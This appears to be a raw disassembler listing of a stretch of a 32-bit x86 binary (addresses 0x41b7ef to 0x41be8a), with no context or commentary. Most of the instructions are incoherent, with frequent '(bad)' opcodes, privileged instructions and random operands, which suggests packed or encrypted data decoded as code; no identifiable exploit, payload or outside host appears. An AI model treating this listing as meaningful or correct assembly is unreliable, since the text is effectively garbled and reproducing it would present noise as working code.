  41b7ef:	call   0x2f4cce0b
  41b7f4:	jle    0x41b86a
  41b7f6:	push   0x7f
  41b7f8:	dec    esp
  41b7f9:	jo     0x41b868
  41b7fb:	dec    esi
  41b7fc:	inc    esi
  41b7fd:	or     eax,0x41037652
  41b802:	push   esi
  41b803:	(bad)  
  41b804:	(bad)  
  41b805:	inc    DWORD PTR [ebp+0x4267426b]
  41b80b:	jae    0x41b868
  41b80d:	sbb    BYTE PTR [esi+0x16],al
  41b810:	push   edi
  41b811:	push   0x56
  41b813:	jnp    0x41b865
  41b815:	push   esp
  41b816:	jle    0x41b846
  41b818:	fs jge 0x41b843
  41b81b:	imul   edx,DWORD PTR [ecx+ecx*2+0x55],0x22
  41b820:	jbe    0x41b821
  41b822:	(bad)  
  41b824:	inc    DWORD PTR [ebp+0x20]
  41b827:	jg     0x41b86f
  41b829:	push   ebp
  41b82a:	dec    ebp
  41b82b:	dec    ecx
  41b82c:	cmp    al,0x61
  41b82e:	cmp    BYTE PTR [edx+0x5f],al
  41b831:	pop    edi
  41b832:	inc    ecx
  41b833:	ins    BYTE PTR es:[edi],dx
  41b834:	or     al,0x32
  41b836:	ja     0x41b88e
  41b838:	pop    esi
  41b839:	push   esi
  41b83a:	or     DWORD PTR [esi],eax
  41b83c:	or     ecx,DWORD PTR [eax+edx*2]
  41b83f:	sub    edx,DWORD PTR [eax]
  41b841:	das    
  41b842:	outs   dx,DWORD PTR ds:[esi]
  41b843:	(bad)  
  41b844:	jmp    FWORD PTR [eax]
  41b846:	add    eax,0x2f0e1415
  41b84b:	cmp    al,BYTE PTR [edx+edi*2]
  41b84e:	sbb    al,0x6
  41b850:	sbb    dl,BYTE PTR [eax]
  41b852:	add    al,0x1e
  41b854:	or     bl,cl
  41b856:	sbb    bh,BYTE PTR [eax+eiz*1]
  41b859:	or     ebp,DWORD PTR [ecx]
  41b85b:	push   ss
  41b85c:	(bad)  
  41b85d:	fstp   st(3)
  41b85f:	xchg   edi,eax
  41b860:	add    BYTE PTR [edi],ah
  41b862:	jno    0x41b8d8
  41b864:	or     esp,DWORD PTR [edi+0x5c]
  41b867:	dec    ebx
  41b868:	push   esi
  41b869:	push   ecx
  41b86a:	addr16 pop edx
  41b86c:	bound  eax,QWORD PTR [edi+edx*2]
  41b86f:	pop    esp
  41b870:	sbb    DWORD PTR [ebx],ebx
  41b872:	fs (bad) 
  41b874:	fstp   TBYTE PTR [edi-0x5]
  41b877:	jp     0x41b8bd
  41b879:	inc    eax
  41b87a:	inc    esi
  41b87b:	inc    esi
  41b87c:	scas   al,BYTE PTR es:[edi]
  41b87d:	arpl   WORD PTR [eax+0x72],si
  41b880:	adc    al,0x49
  41b882:	sub    DWORD PTR [ecx],esi
  41b884:	sub    esp,DWORD PTR [edx+0x2f]
  41b887:	inc    ebx
  41b888:	jbe    0x41b900
  41b88a:	pop    ebx
  41b88b:	jbe    0x41b8e5
  41b88d:	jp     0x41b8d1
  41b88f:	(bad)  
  41b890:	mov    edi,0x7624ffd0
  41b895:	jl     0x41b901
  41b897:	cmp    eax,DWORD PTR [ecx+ebx*2+0x32]
  41b89b:	cmp    DWORD PTR [eax],edi
  41b89d:	and    edi,DWORD PTR [ebx+edx*2+0x7a]
  41b8a1:	inc    ecx
  41b8a2:	xor    esi,DWORD PTR [ecx]
  41b8a4:	sbb    al,0x27
  41b8a6:	and    BYTE PTR [eax],bh
  41b8a8:	sub    ch,BYTE PTR ds:0xffffe93c
  41b8ae:	call   DWORD PTR ds:0x716e3665
  41b8b4:	ins    BYTE PTR es:[edi],dx
  41b8b5:	imul   edi,DWORD PTR [eax+0x1a],0x0
  41b8b9:	pushw  0x3c
  41b8bc:	xor    dh,BYTE PTR ds:0x7c7d1f7b
  41b8c2:	or     al,0x7a
  41b8c4:	jns    0x41b940
  41b8c6:	add    eax,0xe60d130e
  41b8cb:	(bad)  
  41b8cc:	fcomip st,st(0)
  41b8ce:	jg     0x41b944
  41b8d0:	jno    0x41b92a
  41b8d2:	push   cs
  41b8d3:	jnp    0x41b8e8
  41b8d5:	jbe    0x41b93a
  41b8d7:	push   ss
  41b8d8:	or     dl,BYTE PTR [edi+0x906717d]
  41b8de:	jle    0x41b946
  41b8e0:	js     0x41b901
  41b8e2:	sbb    eax,0x1a506919
  41b8e7:	sti    
  41b8e8:	(bad)  
  41b8e9:	(bad)  
  41b8eb:	data16 adc al,0x50
  41b8ee:	jae    0x41b950
  41b8f0:	adc    eax,DWORD PTR [edx+edx*2+0x27]
  41b8f4:	cs loop 0x41b958
  41b8f7:	pusha  
  41b8f8:	sub    DWORD PTR [ebx],esi
  41b8fa:	jnp    0x41b958
  41b8fc:	js     0x41b951
  41b8fe:	push   ebp
  41b8ff:	js     0x41b94c
  41b901:	jge    0x41b93c
  41b903:	dec    ebp
  41b904:	cdq    
  41b905:	(bad)  
  41b906:	call   DWORD PTR [edi]
  41b908:	jle    0x41b93d
  41b90a:	cmp    DWORD PTR [ecx],edi
  41b90c:	pop    eax
  41b90d:	xor    al,0x93
  41b90f:	bound  esi,QWORD PTR [ecx+0x77]
  41b912:	js     0x41b94a
  41b914:	push   eax
  41b915:	or     dl,BYTE PTR [edx]
  41b917:	and    al,0x57
  41b919:	sub    BYTE PTR [esi+eax*1],cl
  41b91c:	xor    dh,BYTE PTR [edx]
  41b91e:	cmp    dl,BYTE PTR [eax+eiz*2]
  41b921:	(bad)  
  41b922:	dec    DWORD PTR [ebx]
  41b924:	std    
  41b925:	or     BYTE PTR [esi+eax*1],al
  41b928:	pusha  
  41b929:	cmp    esi,DWORD PTR [eax]
  41b92b:	rcr    BYTE PTR [eax],cl
  41b92d:	sbb    al,0x24
  41b92f:	cmp    al,0x22
  41b931:	sub    al,BYTE PTR [edx+ecx*1]
  41b934:	sbb    BYTE PTR [esi+edx*1],dl
  41b937:	jo     0x41b96d
  41b939:	invd   
  41b93b:	ja     0x41b945
  41b93d:	(bad)  
  41b93e:	mov    edi,0x486cffd0
  41b943:	pop    eax
  41b944:	push   edx
  41b945:	pop    edx
  41b946:	je     0x41b9c7
  41b948:	imul   ebx,DWORD PTR [esi+0x66],0x7b
  41b94c:	add    eax,0x7b78077c
  41b951:	sbb    esi,DWORD PTR [ebp+0x42]
  41b954:	dec    edx
  41b955:	fs pusha 
  41b957:	js     0x41b9bd
  41b959:	mov    edi,0x76fffff0
  41b95e:	adc    BYTE PTR [ebp+0x4e],dl
  41b961:	adc    DWORD PTR [edi],edx
  41b963:	push   0x72535a4d
  41b968:	jp     0x41b9c1
  41b96a:	push   0x20464457
  41b96f:	jle    0x41b9cf
  41b971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b972:	pop    eax
  41b973:	pop    ebp
  41b974:	pop    esi
  41b975:	jl     0x41b9d9
  41b977:	mov    edi,0x6ae17ff1
  41b97c:	inc    edi
  41b97d:	jge    0x41b938
  41b97f:	push   esi
  41b980:	xor    BYTE PTR [edi+0x35],ch
  41b983:	sub    eax,0x6372e37
  41b988:	or     al,0x6a
  41b98a:	sub    eax,0xc241528
  41b98f:	(bad)  
  41b990:	(bad)  
  41b991:	jg     0x41b974
  41b993:	outs   dx,BYTE PTR ds:[esi]
  41b994:	xor    DWORD PTR [edx],ebp
  41b996:	dec    esp
  41b997:	push   ds
  41b998:	pop    es
  41b999:	cmp    bh,BYTE PTR [eax]
  41b99b:	cmp    al,0x30
  41b99d:	sbb    eax,0x1c341e35
  41b9a2:	jle    0x41b9ca
  41b9a4:	sub    bh,BYTE PTR [eax]
  41b9a6:	jno    0x41b9b6
  41b9a8:	pop    ss
  41b9a9:	and    DWORD PTR ds:[eax+eiz*1],ebp
  41b9ad:	push   esi
  41b9af:	(bad)  
  41b9b1:	push   cs
  41b9b2:	pcmpeqb mm0,QWORD PTR [esp+ebp*2+0xe]
  41b9b7:	push   edi
  41b9b8:	je     0x41ba34
  41b9ba:	add    ebp,eax
  41b9bc:	or     eax,0x7e505c54
  41b9c1:	sbb    al,0x7e
  41b9c3:	jl     0x41b9e3
  41b9c5:	inc    esp
  41b9c6:	pop    ds
  41b9c7:	outs   dx,BYTE PTR ds:[esi]
  41b9c8:	adc    DWORD PTR [ebp+0x6efb7fff],ecx
  41b9ce:	jbe    0x41ba38
  41b9d0:	push   edx
  41b9d1:	dec    esp
  41b9d2:	dec    esp
  41b9d3:	sub    DWORD PTR [esi],ebp
  41b9d5:	and    eax,0x6b742e6e
  41b9da:	sub    dl,BYTE PTR [ebp+0x5e]
  41b9dd:	inc    ebx
  41b9de:	dec    esp
  41b9df:	push   esp
  41b9e0:	cmp    eax,0xf9726363
  41b9e5:	(bad)  
  41b9e6:	call   DWORD PTR [edi+0x5e]
  41b9e9:	dec    ecx
  41b9ea:	dec    edi
  41b9eb:	inc    edx
  41b9ec:	pop    ebx
  41b9ed:	dec    esp
  41b9ee:	inc    eax
  41b9ef:	pop    edi
  41b9f0:	je     0x41ba3c
  41b9f2:	jbe    0x41ba3d
  41b9f4:	inc    edi
  41b9f5:	sbb    al,0x29
  41b9f7:	adc    DWORD PTR [ebx+0x0],ebx
  41b9fa:	push   esp
  41b9fb:	adc    ch,BYTE PTR [eax+0x26]
  41b9fe:	dec    DWORD PTR [ebp+0x1effff]
  41ba04:	add    ebp,DWORD PTR [edi+0x2c]
  41ba07:	bound  esi,QWORD PTR [edx]
  41ba09:	push   0x21
  41ba0b:	cmp    eax,0x7c753c77
  41ba10:	add    al,0x20
  41ba12:	sbb    eax,0xe296d77
  41ba17:	cs adc eax,0x5f02a07
  41ba1d:	inc    BYTE PTR [esi+0x5e]
  41ba20:	or     edi,DWORD PTR [edi+0x42]
  41ba23:	adc    DWORD PTR [ecx],eax
  41ba25:	or     esp,DWORD PTR [edx]
  41ba27:	add    eax,0xff7c577d
  41ba2c:	pop    edi
  41ba2d:	(bad)  
  41ba2e:	lods   eax,DWORD PTR ds:[esi]
  41ba2f:	icebp  
  41ba30:	(bad)  
  41ba31:	bound  esp,QWORD PTR [edi+0x1d]
  41ba34:	dec    edi
  41ba35:	sbb    DWORD PTR [ecx+0x70],edi
  41ba38:	jne    0x41baae
  41ba3a:	adc    eax,DWORD PTR [esi+0x10]
  41ba3d:	pop    ecx
  41ba3e:	xor    DWORD PTR [edi+0x4d],edx
  41ba41:	ja     0x41baa3
  41ba43:	pop    esi
  41ba44:	rcr    DWORD PTR [eax-0x8],1
  41ba47:	push   DWORD PTR [edi]
  41ba49:	gs pop eax
  41ba4b:	pop    esi
  41ba4c:	pop    edx
  41ba4d:	popa   
  41ba4e:	fs inc ebx
  41ba50:	dec    ecx
  41ba51:	and    al,0x42
  41ba53:	pop    ecx
  41ba54:	popa   
  41ba55:	idiv   DWORD PTR [edi]
  41ba57:	iret   
  41ba58:	jmp    DWORD PTR [ebp+0x5627bfff]
  41ba5e:	xor    eax,DWORD PTR ss:[edx+ebp*1+0x29]
  41ba63:	sub    al,0x54
  41ba65:	sub    DWORD PTR [edx],edx
  41ba67:	or     dl,BYTE PTR [eax]
  41ba69:	push   ss
  41ba6a:	adc    BYTE PTR [ebx+0x10],dh
  41ba6d:	cmp    BYTE PTR [esi+eiz*1],bl
  41ba70:	sbb    eax,0xe21f3231
  41ba75:	dec    DWORD PTR [ebp+0x2c1cc96f]
  41ba7b:	sbb    edi,DWORD PTR [edx+0x63]
  41ba7e:	add    edi,DWORD PTR [edi+0x3e]
  41ba81:	or     al,0xd
  41ba83:	jb     0x41baa1
  41ba85:	ja     0x41ba96
  41ba87:	ja     0x41bab3
  41ba89:	jmp    FWORD PTR [edi+0x1b]
  41ba8c:	fild   QWORD PTR [ecx+0x7d544a4c]
  41ba92:	ret    0xcd71
  41ba95:	dec    esi
  41ba96:	add    bh,BYTE PTR [edi+0x7d]
  41ba99:	add    DWORD PTR [edx+0x69],ecx
  41ba9c:	dec    edi
  41ba9d:	push   0xfe977912
  41baa2:	(bad)  
  41baa3:	in     eax,dx
  41baa4:	sbb    al,0x4a
  41baa6:	outs   dx,DWORD PTR ds:[esi]
  41baa7:	mov    edi,0x50737915
  41baac:	inc    edx
  41baad:	jb     0x41bb03
  41baaf:	inc    esp
  41bab0:	push   ebx
  41bab1:	push   0x70
  41bab3:	dec    esi
  41bab4:	push   edi
  41bab5:	daa    
  41bab6:	xor    BYTE PTR es:[edi+0x22],bl
  41baba:	clc    
  41babb:	test   esi,esi
  41babd:	jmp    DWORD PTR [ecx]
  41babf:	and    DWORD PTR [ebx+edi*1+0x5a],ebp
  41bac3:	cmp    al,0x3b
  41bac5:	xor    ebp,DWORD PTR [edx+0x7c]
  41bac8:	pop    edi
  41bac9:	dec    esp
  41baca:	enter  0x6259,0x30
  41bace:	xor    dh,BYTE PTR cs:[edi]
  41bad1:	mov    edi,0xddd8dffd
  41bad6:	sub    eax,0x1a6c695c
  41badb:	push   ds
  41badc:	adc    al,0x6f
  41bade:	add    eax,DWORD PTR [ebx]
  41bae0:	xor    DWORD PTR [ebp-0x35],esp
  41bae3:	xor    al,0x2a
  41bae5:	pusha  
  41bae6:	add    BYTE PTR [edi],bh
  41bae8:	std    
  41bae9:	pop    edi
  41baea:	clc    
  41baeb:	push   DWORD PTR [eax+eiz*2]
  41baee:	xor    esi,DWORD PTR [eax+0x29]
  41baf1:	or     DWORD PTR [ecx],edx
  41baf3:	adc    al,0x74
  41baf5:	cmp    DWORD PTR [edi+0x26],esi
  41baf8:	cmp    ecx,edx
  41bafa:	push   ss
  41bafb:	push   0x5a
  41bafd:	dec    edi
  41bafe:	pop    eax
  41baff:	inc    edx
  41bb00:	arpl   WORD PTR [esi],cx
  41bb02:	fs popa 
  41bb04:	jg     0x41baa7
  41bb06:	(bad)  
  41bb07:	mov    edi,0x5b776b68
  41bb0c:	push   edi
  41bb0d:	pop    eax
  41bb0e:	pop    ds
  41bb0f:	push   0x6c4a4545
  41bb14:	bound  esi,QWORD PTR [edi+0x51]
  41bb17:	and    BYTE PTR [eax],dl
  41bb19:	dec    ecx
  41bb1a:	jo     0x41bb98
  41bb1c:	inc    ebp
  41bb1d:	ja     0x41bade
  41bb1f:	icebp  
  41bb20:	sar    bh,cl
  41bb22:	sub    BYTE PTR [ecx+ebp*2+0x2d],bh
  41bb26:	push   eax
  41bb27:	inc    ebx
  41bb28:	and    ch,BYTE PTR ds:0x2483224b
  41bb2e:	inc    ebx
  41bb2f:	dec    edx
  41bb30:	int    0x67
  41bb32:	ins    DWORD PTR es:[edi],dx
  41bb33:	jnp    0x41bb86
  41bb35:	ins    DWORD PTR es:[edi],dx
  41bb36:	outs   dx,DWORD PTR ds:[esi]
  41bb37:	cld    
  41bb38:	push   DWORD PTR [edi+0x5149df5d]
  41bb3e:	adc    BYTE PTR ds:0x51332d3e,dl
  41bb44:	cmp    BYTE PTR [ebx],ch
  41bb46:	xor    bh,BYTE PTR [edi]
  41bb48:	or     eax,0xc214371d
  41bb4d:	and    eax,0xffff7f11
  41bb52:	(bad)  
  41bb53:	(bad)  
  41bb54:	cmp    ah,BYTE PTR [ecx+0x25]
  41bb57:	push   ds
  41bb58:	cmp    DWORD PTR [edi],edx
  41bb5a:	sub    DWORD PTR [edi],ecx
  41bb5c:	cmp    DWORD PTR ds:0x921192a,ebx
  41bb62:	aaa    
  41bb63:	adc    ebp,DWORD PTR [eax+0x25]
  41bb66:	sbb    DWORD PTR [eax],edi
  41bb68:	imul   edx,DWORD PTR [ecx+0x5],0x68407f0a
  41bb6f:	pop    ebp
  41bb70:	pop    eax
  41bb71:	outs   dx,BYTE PTR ds:[esi]
  41bb72:	push   ecx
  41bb73:	jl     0x41bb66
  41bb75:	mov    bh,0xdf
  41bb77:	outs   dx,BYTE PTR ds:[esi]
  41bb78:	addr16 jbe 0x41bbf6
  41bb7b:	inc    edi
  41bb7c:	inc    ebp
  41bb7d:	dec    ebx
  41bb7e:	inc    eax
  41bb7f:	jo     0x41bc00
  41bb81:	add    DWORD PTR [edx+0x61],eax
  41bb84:	jle    0x41bbdf
  41bb86:	adc    al,0xa
  41bb88:	mov    edi,0xe1bff4b1
  41bb8d:	inc    esp
  41bb8e:	jle    0x41bbff
  41bb90:	bound  ebp,QWORD PTR [ebp+0x52]
  41bb93:	and    DWORD PTR [edi+0x5e],esp
  41bb96:	inc    edi
  41bb97:	inc    edi
  41bb98:	call   0x3b4f:0x6e474e58
  41bb9f:	fdivrp st(0),st
  41bba1:	jmp    FWORD PTR [ebp+0x7f]
  41bba4:	ins    DWORD PTR es:[edi],dx
  41bba5:	pop    ecx
  41bba6:	imul   esp,DWORD PTR [edi+0x68],0x453a6070
  41bbad:	pop    esi
  41bbae:	cld    
  41bbaf:	dec    ebp
  41bbb0:	add    eax,0x2a080923
  41bbb5:	sub    bh,bh
  41bbb7:	call   FWORD PTR [ebx]
  41bbb9:	call   FWORD PTR [esi]
  41bbbb:	or     DWORD PTR [edx+0x6],esp
  41bbbe:	xor    DWORD PTR [eax+0x1],esp
  41bbc1:	cmp    ebx,DWORD PTR [edi+0x3740537]
  41bbc7:	sub    al,0x25
  41bbc9:	and    BYTE PTR [edi],bl
  41bbcb:	sub    DWORD PTR cs:[edx],ecx
  41bbce:	and    eax,0x36226977
  41bbd3:	jns    0x41bc04
  41bbd5:	std    
  41bbd6:	(bad)  
  41bbd7:	push   DWORD PTR [edi+0x7e]
  41bbda:	jb     0x41bc52
  41bbdc:	or     al,BYTE PTR [ecx]
  41bbde:	push   ebp
  41bbdf:	jge    0x41bc34
  41bbe1:	data16 jp 0x41bbe6
  41bbe4:	jge    0x41bbed
  41bbe6:	jno    0x41bc07
  41bbe8:	push   ds
  41bbe9:	push   ebp
  41bbea:	jp     0x41bc47
  41bbec:	ins    DWORD PTR es:[edi],dx
  41bbed:	sbb    eax,0x41434875
  41bbf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbf4:	jmp    FWORD PTR [edi+0x3]
  41bbf7:	jns    0x41bc63
  41bbf9:	jno    0x41bc22
  41bbfb:	push   ebx
  41bbfc:	push   esp
  41bbfd:	pop    eax
  41bbfe:	sub    eax,0x7070575e
  41bc03:	inc    ebx
  41bc04:	jns    0x41bc15
  41bc06:	das    
  41bc07:	sub    al,0xfd
  41bc09:	jmp    FWORD PTR [ecx+0x56]
  41bc0c:	bound  ebp,QWORD PTR [ebx+0x7b]
  41bc0f:	outs   dx,BYTE PTR ds:[esi]
  41bc10:	inc    ecx
  41bc11:	aas    
  41bc12:	push   eax
  41bc13:	jb     0x41bc65
  41bc15:	cmp    eax,0xeb7374b
  41bc1a:	xchg   esp,eax
  41bc1b:	dec    esp
  41bc1c:	push   ebx
  41bc1d:	sub    edi,edi
  41bc1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc20:	(bad)  
  41bc22:	and    eax,DWORD PTR [esi]
  41bc24:	xor    ebp,DWORD PTR [ecx]
  41bc26:	push   es
  41bc27:	pop    ebx
  41bc28:	cmp    BYTE PTR [eax],ah
  41bc2a:	add    dl,BYTE PTR [eax]
  41bc2c:	ss pop edi
  41bc2e:	sub    ebp,DWORD PTR [ecx+0x15]
  41bc31:	cmp    edx,DWORD PTR [esi]
  41bc33:	add    DWORD PTR [ebx+ebx*1+0xb],esi
  41bc37:	mov    edi,0x1333ffc1
  41bc3c:	push   cs
  41bc3d:	aas    
  41bc3e:	xor    al,BYTE PTR [ecx]
  41bc40:	sub    esi,DWORD PTR [eax+esi*1]
  41bc43:	add    eax,0x5d7b7162
  41bc48:	dec    edi
  41bc49:	dec    edi
  41bc4a:	jg     0x41bcb0
  41bc4c:	(bad)  
  41bc4d:	fistp  WORD PTR [eax-0x8]
  41bc50:	push   ecx
  41bc51:	jnp    0x41bcd0
  41bc53:	bound  edi,QWORD PTR [ebp+0x2b]
  41bc56:	pop    esp
  41bc57:	cmp    eax,0x269616b
  41bc5c:	pop    ds
  41bc5d:	data16 jo 0x41bccc
  41bc60:	push   ebx
  41bc61:	jne    0x41bcbb
  41bc63:	inc    esp
  41bc64:	jo     0x41bc07
  41bc66:	pop    edi
  41bc67:	cli    
  41bc68:	adc    bh,BYTE PTR [edx+0x47]
  41bc6b:	jl     0x41bcb3
  41bc6d:	xor    dh,BYTE PTR [ecx+0x41]
  41bc70:	and    DWORD PTR [edi+0x6d],ebx
  41bc73:	cmp    eax,0xff4b2777
  41bc78:	pop    ss
  41bc79:	or     BYTE PTR cs:[ebx+0x74],al
  41bc7d:	xor    ecx,DWORD PTR [eax+0x4e]
  41bc80:	dec    ebx
  41bc81:	dec    esi
  41bc82:	xor    BYTE PTR [esi+0x36],ch
  41bc85:	inc    edi
  41bc86:	outs   dx,DWORD PTR ds:[si]
  41bc88:	push   ss
  41bc89:	pop    esp
  41bc8a:	(bad)  
  41bc8b:	(bad)  
  41bc8c:	(bad)  
  41bc8d:	call   FWORD PTR [ebx]
  41bc8f:	push   ebx
  41bc90:	xor    eax,0x2f163710
  41bc95:	cmp    DWORD PTR [eax+0x16],esi
  41bc98:	sub    DWORD PTR [ecx],ebx
  41bc9a:	push   ss
  41bc9b:	sbb    BYTE PTR [eax],bh
  41bc9d:	xor    BYTE PTR [eax],dh
  41bc9f:	and    al,0x66
  41bca1:	adc    eax,0x7b7d272a
  41bca6:	xor    bl,BYTE PTR [ebx+edi*1]
  41bca9:	daa    
  41bcaa:	adc    ah,BYTE PTR [edi]
  41bcac:	sbb    al,0xb
  41bcae:	das    
  41bcaf:	mov    ebp,0x332ffd5
  41bcb4:	add    dh,BYTE PTR [ebx+0xf]
  41bcb7:	js     0x41bcc2
  41bcb9:	jnp    0x41bd23
  41bcbb:	pop    esp
  41bcbc:	fs jl  0x41bd24
  41bcbf:	dec    edi
  41bcc0:	repnz inc edx
  41bcc2:	inc    edi
  41bcc3:	add    bh,bh
  41bcc5:	call   DWORD PTR [edi]
  41bcc7:	(bad)  
  41bcc8:	sbb    eax,0x5e5e4246
  41bccd:	gs push ds
  41bccf:	das    
  41bcd0:	inc    ecx
  41bcd1:	jg     0x41bd42
  41bcd3:	jno    0x41bceb
  41bcd5:	dec    ebx
  41bcd6:	push   esp
  41bcd7:	jl     0x41bd40
  41bcd9:	push   ebx
  41bcda:	sub    BYTE PTR gs:[ebx+0x53],al
  41bcde:	xor    esp,DWORD PTR [edx]
  41bce0:	pop    edx
  41bce1:	pop    eax
  41bce2:	idiv   bh
  41bce4:	outs   dx,DWORD PTR ds:[esi]
  41bce5:	cld    
  41bce6:	pop    ebx
  41bce7:	pop    ebx
  41bce8:	arpl   WORD PTR [ebx+0x29],ax
  41bceb:	pop    ebp
  41bcec:	test   BYTE PTR [eax+0x5b],ch
  41bcef:	fs aas 
  41bcf1:	pop    esp
  41bcf2:	gs push edx
  41bcf4:	push   0x6d
  41bcf6:	sub    BYTE PTR [eax+0x2e],bl
  41bcf9:	push   ecx
  41bcfa:	adc    edx,DWORD PTR [edi]
  41bcfc:	(bad)  
  41bcfd:	(bad)  
  41bcfe:	jg     0x41bcfb
  41bd00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd01:	xor    ebx,DWORD PTR ds:0x6f1b7232
  41bd07:	add    DWORD PTR [ecx],esp
  41bd09:	adc    BYTE PTR ds:0x186b1f61,ah
  41bd0f:	popa   
  41bd10:	and    BYTE PTR ds:[eax+0x17],bh
  41bd14:	sbb    esp,DWORD PTR [esi]
  41bd16:	clc    
  41bd17:	(bad)  
  41bd18:	dec    DWORD PTR [ebx-0x66]
  41bd1b:	and    al,0x73
  41bd1d:	jae    0x41bd91
  41bd1f:	sub    dl,BYTE PTR ds:0x51190472
  41bd25:	jo     0x41bd80
  41bd27:	push   edx
  41bd28:	inc    edx
  41bd29:	pop    esp
  41bd2a:	push   edx
  41bd2b:	pop    ebx
  41bd2c:	vmwrite eax,DWORD PTR ds:0xfeb7595f
  41bd33:	jbe    0x41bd90
  41bd35:	nop
  41bd36:	jp     0x41bd96
  41bd38:	inc    ebp
  41bd39:	push   ds
  41bd3a:	data16 jnp 0x41bda2
  41bd3d:	dec    esi
  41bd3e:	dec    esi
  41bd3f:	pusha  
  41bd40:	dec    esp
  41bd41:	inc    ecx
  41bd42:	sbb    BYTE PTR [eax],dl
  41bd44:	das    
  41bd45:	icebp  
  41bd46:	mov    edi,0x7d447bc0
  41bd4b:	push   0x6c
  41bd4d:	sub    bl,BYTE PTR [ebx+0x7f]
  41bd50:	and    al,0x2c
  41bd52:	push   ebx
  41bd53:	and    al,0x76
  41bd55:	jge    0x41bdc5
  41bd57:	dec    ebx
  41bd58:	std    
  41bd59:	ffreep st(0)
  41bd5b:	jmp    DWORD PTR [ebx+0x38]
  41bd5e:	dec    esp
  41bd5f:	cmp    ecx,DWORD PTR [edi+0x47]
  41bd62:	jbe    0x41bd99
  41bd64:	xor    cl,BYTE PTR [eax+0x26]
  41bd67:	and    al,0x3f
  41bd69:	push   ds
  41bd6a:	adc    dh,BYTE PTR [esi]
  41bd6c:	and    ch,BYTE PTR [edi]
  41bd6e:	xor    al,0x32
  41bd70:	ins    BYTE PTR es:[edi],dx
  41bd71:	adc    edi,edi
  41bd73:	inc    esi
  41bd75:	sbb    edx,DWORD PTR [esi]
  41bd77:	push   ds
  41bd78:	ins    DWORD PTR es:[edi],dx
  41bd79:	and    al,0x58
  41bd7b:	pusha  
  41bd7c:	addr16 pusha 
  41bd7e:	xor    al,0x3f
  41bd80:	sbb    eax,0xf20347c
  41bd85:	cmp    eax,0x75062722
  41bd8a:	(bad)  
  41bd8b:	inc    DWORD PTR [ebp+0x351535ff]
  41bd91:	or     BYTE PTR [eax],ah
  41bd93:	sub    eax,DWORD PTR [edi]
  41bd95:	dec    eax
  41bd96:	push   eax
  41bd97:	pop    ds
  41bd98:	je     0x41bdf6
  41bd9a:	inc    eax
  41bd9b:	add    DWORD PTR [ebx+0x6c],ebx
  41bd9e:	jb     0x41bde9
  41bda0:	push   0x4b5b6276
  41bda5:	dec    esp
  41bda6:	push   0x97f4aadf
  41bdab:	fstp   TBYTE PTR [edi+0x10]
  41bdae:	adc    edi,DWORD PTR [esi+0x7d]
  41bdb1:	pop    ebp
  41bdb2:	jle    0x41bda8
  41bdb4:	jl     0x41be0e
  41bdb6:	js     0x41be29
  41bdb8:	ret    0x97c2
  41bdbb:	(bad)  
  41bdbc:	and    dh,BYTE PTR [eax+0x4c]
  41bdbf:	dec    esp
  41bdc0:	das    
  41bdc1:	pop    edi
  41bdc2:	and    eax,0x685e232d
  41bdc7:	inc    eax
  41bdc8:	sub    eax,0x70bffe56
  41bdcd:	sti    
  41bdce:	inc    DWORD PTR [edi+0x63]
  41bdd1:	inc    ebp
  41bdd2:	xor    eax,0x4b625d4b
  41bdd7:	dec    edx
  41bdd8:	adc    al,0x21
  41bdda:	and    eax,0x7c0350e7
  41bddf:	jb     0x41be12
  41bde1:	movhps QWORD PTR [eax],xmm5
  41bde4:	cld    
  41bde5:	jg     0x41bd6a
  41bde7:	add    bl,BYTE PTR [ecx]
  41bde9:	pop    edi
  41bdea:	cmp    DWORD PTR cs:[esi],edx
  41bded:	arpl   WORD PTR [eax+0xe],sp
  41bdf0:	or     eax,0x7d3d260f
  41bdf5:	daa    
  41bdf6:	idiv   BYTE PTR [edi+0x2586ffd]
  41bdfc:	ss cmp eax,0x3374330c
  41be02:	push   edx
  41be03:	jo     0x41bda2
  41be05:	pop    ecx
  41be06:	outs   dx,BYTE PTR ds:[esi]
  41be07:	push   0x5a65797d
  41be0c:	ins    DWORD PTR es:[edi],dx
  41be0d:	push   ecx
  41be0e:	enter  0xb85f,0xf1
  41be12:	inc    DWORD PTR [esi+0x44]
  41be15:	imul   esp,DWORD PTR [edi+0x4b],0x69
  41be19:	sbb    bl,BYTE PTR [eax]
  41be1b:	outs   dx,BYTE PTR ds:[esi]
  41be1c:	adc    BYTE PTR [esi+edx*1+0x45],bl
  41be20:	sbb    ch,BYTE PTR [esi+0x722d4459]
  41be26:	push   ecx
  41be27:	add    dl,bh
  41be29:	shl    BYTE PTR [ebx],cl
  41be2b:	je     0x41be3d
  41be2d:	push   esi
  41be2e:	das    
  41be2f:	and    esi,DWORD PTR [esi-0x25]
  41be32:	mov    ds:0x3fbfffc1,eax
  41be37:	and    eax,0x736c7944
  41be3c:	outs   dx,BYTE PTR ds:[esi]
  41be3d:	and    esi,DWORD PTR [ecx]
  41be3f:	aaa    
  41be40:	jge    0x41be90
  41be42:	jp     0x41beab
  41be44:	jae    0x41be97
  41be46:	or     eax,eax
  41be48:	inc    DWORD PTR ds:0x630d637e
  41be4e:	outs   dx,BYTE PTR ds:[esi]
  41be4f:	sub    BYTE PTR [ecx],ch
  41be51:	or     eax,0x27349502
  41be56:	add    DWORD PTR [edx+0x22],esp
  41be59:	cmp    DWORD PTR [ecx],ebp
  41be5b:	add    edi,DWORD PTR [edi+0x76ffab71]
  41be61:	cmp    eax,0x52f040a
  41be66:	aas    
  41be67:	sbb    ebp,DWORD PTR [edi]
  41be69:	in     eax,dx
  41be6a:	imul   ebx,DWORD PTR [ebx],0xc
  41be6d:	outs   dx,DWORD PTR ds:[esi]
  41be6e:	jae    0x41be79
  41be70:	dec    edx
  41be71:	jne    0x41be72
  41be73:	push   es
  41be74:	das    
  41be75:	cmc    
  41be76:	inc    ecx
  41be77:	push   edx
  41be78:	dec    eax
  41be79:	or     DWORD PTR [ecx+0x57],ecx
  41be7c:	add    BYTE PTR [edi+0x4],dh
  41be7f:	add    ecx,DWORD PTR [esi+0x43]
  41be82:	outs   dx,BYTE PTR ds:[esi]
  41be83:	jl     0x41be9f
  41be85:	popa   
  41be86:	in     eax,dx
  41be87:	aaa    
  41be88:	jle    0x41be6b
  41be8a:	pop    esp
